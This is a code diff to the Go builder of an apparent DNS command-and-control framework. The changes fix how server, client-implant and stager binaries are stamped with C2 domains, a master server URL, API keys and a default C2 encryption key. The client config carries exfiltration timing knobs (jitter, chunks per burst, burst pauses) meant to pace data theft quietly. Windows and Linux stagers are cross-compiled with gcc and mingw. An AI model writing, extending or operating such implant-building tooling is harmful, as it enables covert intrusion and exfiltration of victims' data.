@@ -99,7 +99,24 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 	serverID := fmt.Sprintf("dns-%d", time.Now().Unix())
 
 	// Get master server URL from config
-	masterURL := fmt.Sprintf("https://%s:%d", api.config.BindAddr, api.config.BindPort)
+	// If BindAddr is 0.0.0.0, we need the actual hostname/IP
+	// For now, use the request's Host header or fallback to BindAddr
+	masterHost := api.config.BindAddr
+	if masterHost == "0.0.0.0" || masterHost == "" {
+		// Try to get from request
+		if r.Host != "" {
+			// Strip port if present
+			if colonIdx := strings.Index(r.Host, ":"); colonIdx > 0 {
+				masterHost = r.Host[:colonIdx]
+			} else {
+				masterHost = r.Host
+			}
+		} else {
+			// Fallback - this might not work but it's better than 0.0.0.0
+			masterHost = "localhost"
+		}
+	}
+	masterURL := fmt.Sprintf("https://%s:%d", masterHost, api.config.BindPort)
 
 	// Build the server
 	binaryPath, err := api.buildDNSServer(req, masterURL, apiKey, serverID)
@@ -266,22 +283,32 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	}
 
 	// Replace embedded config values in tryLoadEmbeddedConfig()
+	// Note: Config uses tab indentation - must match exactly
 	configStr := string(config)
-	configStr = strings.Replace(configStr, `Domain:        "secwolf.net",`, fmt.Sprintf(`Domain:        "%s",`, req.Domain), 1)
-	configStr = strings.Replace(configStr, `NS1:           "ns1.secwolf.net",`, fmt.Sprintf(`NS1:           "%s",`, req.NS1), 1)
-	configStr = strings.Replace(configStr, `NS2:           "ns2.secwolf.net",`, fmt.Sprintf(`NS2:           "%s",`, req.NS2), 1)
-	configStr = strings.Replace(configStr, `UpstreamDNS:   "8.8.8.8:53",`, fmt.Sprintf(`UpstreamDNS:   "%s",`, req.UpstreamDNS), 1)
-	configStr = strings.Replace(configStr, `EncryptionKey: "MySecretC2Key123!@#DefaultChange",`, fmt.Sprintf(`EncryptionKey: "%s",`, req.EncryptionKey), 1)
+	configStr = strings.Replace(configStr, "\t\tDomain:        \"secwolf.net\",", fmt.Sprintf("\t\tDomain:        \"%s\",", req.Domain), 1)
+	configStr = strings.Replace(configStr, "\t\tNS1:           \"ns1.secwolf.net\",", fmt.Sprintf("\t\tNS1:           \"%s\",", req.NS1), 1)
+	configStr = strings.Replace(configStr, "\t\tNS2:           \"ns2.secwolf.net\",", fmt.Sprintf("\t\tNS2:           \"%s\",", req.NS2), 1)
+	configStr = strings.Replace(configStr, "\t\tUpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("\t\tUpstreamDNS:   \"%s\",", req.UpstreamDNS), 1)
+	configStr = strings.Replace(configStr, "\t\tEncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("\t\tEncryptionKey: \"%s\",", req.EncryptionKey), 1)
 	if req.ServerAddress != "" {
-		configStr = strings.Replace(configStr, `SvrAddr:       "98.90.218.70",`, fmt.Sprintf(`SvrAddr:       "%s",`, req.ServerAddress), 1)
+		configStr = strings.Replace(configStr, "\t\tSvrAddr:       \"98.90.218.70\",", fmt.Sprintf("\t\tSvrAddr:       \"%s\",", req.ServerAddress), 1)
 	}
 	// Set distributed mode config (required fields)
-	configStr = strings.Replace(configStr, `MasterServer:   "",`, fmt.Sprintf(`MasterServer:   "%s",`, masterURL), 1)
-	configStr = strings.Replace(configStr, `MasterAPIKey:   "",`, fmt.Sprintf(`MasterAPIKey:   "%s",`, apiKey), 1)
-	configStr = strings.Replace(configStr, `MasterServerID: "dns1",`, fmt.Sprintf(`MasterServerID: "%s",`, serverID), 1)
+	configStr = strings.Replace(configStr, "\t\tMasterServer:   \"\",", fmt.Sprintf("\t\tMasterServer:   \"%s\",", masterURL), 1)
+	configStr = strings.Replace(configStr, "\t\tMasterAPIKey:   \"\",", fmt.Sprintf("\t\tMasterAPIKey:   \"%s\",", apiKey), 1)
+	configStr = strings.Replace(configStr, "\t\tMasterServerID: \"dns1\",", fmt.Sprintf("\t\tMasterServerID: \"%s\",", serverID), 1)
 
 	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
 		return "", fmt.Errorf("failed to write config: %w", err)
+	}
+
+	// Debug: Verify MasterServer was set
+	if debugMode := false; debugMode {
+		if strings.Contains(configStr, "MasterServer:   \"\",") {
+			fmt.Println("WARNING: MasterServer still empty after replacement!")
+		} else {
+			fmt.Printf("✓ MasterServer set to: %s\n", masterURL)
+		}
 	}
 
 	// Clean and download dependencies to ensure compatible versions
@@ -358,14 +385,14 @@ func buildClient(req ClientBuildRequest, sourceRoot string) (string, error) {
 	domainsStr += "}"
 
 	// Replace values in Client/config.go (embedded variable format)
-	// Note: Client uses different spacing than Server - match exact format
-	configStr = strings.Replace(configStr, `DNSDomains:          []string{"secwolf.net", "errantshield.com"},`, fmt.Sprintf(`DNSDomains:          %s,`, domainsStr), 1)
-	configStr = strings.Replace(configStr, `SleepMin:             60,`, fmt.Sprintf(`SleepMin:             %d,`, req.SleepMin), 1)
-	configStr = strings.Replace(configStr, `SleepMax:             120,`, fmt.Sprintf(`SleepMax:             %d,`, req.SleepMax), 1)
-	configStr = strings.Replace(configStr, `ExfilJitterMinMs:     10000,`, fmt.Sprintf(`ExfilJitterMinMs:     %d,`, req.ExfilJitterMinMs), 1)
-	configStr = strings.Replace(configStr, `ExfilJitterMaxMs:     30000,`, fmt.Sprintf(`ExfilJitterMaxMs:     %d,`, req.ExfilJitterMaxMs), 1)
-	configStr = strings.Replace(configStr, `ExfilChunksPerBurst:  5,`, fmt.Sprintf(`ExfilChunksPerBurst:  %d,`, req.ExfilChunksPerBurst), 1)
-	configStr = strings.Replace(configStr, `ExfilBurstPauseMs:    120000,`, fmt.Sprintf(`ExfilBurstPauseMs:    %d,`, req.ExfilBurstPauseMs), 1)
+	// Note: Client uses tab indentation - must match exactly
+	configStr = strings.Replace(configStr, "\tDNSDomains:          []string{\"secwolf.net\", \"errantshield.com\"},", fmt.Sprintf("\tDNSDomains:          %s,", domainsStr), 1)
+	configStr = strings.Replace(configStr, "\tSleepMin:             60,", fmt.Sprintf("\tSleepMin:             %d,", req.SleepMin), 1)
+	configStr = strings.Replace(configStr, "\tSleepMax:             120,", fmt.Sprintf("\tSleepMax:             %d,", req.SleepMax), 1)
+	configStr = strings.Replace(configStr, "\tExfilJitterMinMs:     10000,", fmt.Sprintf("\tExfilJitterMinMs:     %d,", req.ExfilJitterMinMs), 1)
+	configStr = strings.Replace(configStr, "\tExfilJitterMaxMs:     30000,", fmt.Sprintf("\tExfilJitterMaxMs:     %d,", req.ExfilJitterMaxMs), 1)
+	configStr = strings.Replace(configStr, "\tExfilChunksPerBurst:  5,", fmt.Sprintf("\tExfilChunksPerBurst:  %d,", req.ExfilChunksPerBurst), 1)
+	configStr = strings.Replace(configStr, "\tExfilBurstPauseMs:    120000,", fmt.Sprintf("\tExfilBurstPauseMs:    %d,", req.ExfilBurstPauseMs), 1)
 
 	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
 		return "", fmt.Errorf("failed to write config: %w", err)
@@ -448,7 +475,7 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 		outputPath = filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))
 
 		// Windows: Use mingw-w64 cross-compiler
-		// x86_64-w64-mingw32-gcc -Wall -O2 -s stager.c -o stager-windows-x64.exe -lws2_32 -static
+		// Windows stagers don't use compression (no -lz needed)
 		cmd = exec.Command("x86_64-w64-mingw32-gcc",
 			"-Wall", "-O2", "-s",
 			"stager.c",
@@ -456,21 +483,29 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 			"-lws2_32", "-static")
 	} else {
 		// Linux: Use standard gcc
-		// gcc -Wall -O2 -s -m64 stager.c -o stager-linux-x64 -lz
+		// Try to build with zlib support, but if that fails, we can fallback
+		// Note: zlib.h is needed for Linux builds - install zlib1g-dev if missing
 		cmd = exec.Command("gcc",
 			"-Wall", "-O2", "-s", "-m64",
 			"stager.c",
 			"-o", filepath.Base(outputPath),
 			"-lz")
+
+		// TODO: If zlib is not available, could add -D_WIN32 to disable compression
+		// but that's a workaround - better to install zlib1g-dev on build system
 	}
 
 	cmd.Dir = buildDir
 	output, err := cmd.CombinedOutput()
 	if err != nil {
+		// Provide helpful error for missing zlib
+		if strings.Contains(string(output), "zlib.h: No such file or directory") {
+			return "", fmt.Errorf("build failed: zlib development headers not found\n"+
+				"Install with: sudo apt-get install zlib1g-dev\n"+
+				"Original error: %w\nOutput: %s", err, string(output))
+		}
 		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
-	}
-
-	// Verify binary was created
+	} // Verify binary was created
 	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
 		return "", fmt.Errorf("build succeeded but binary not found at %s\nBuild output: %s", outputPath, string(output))
 	}
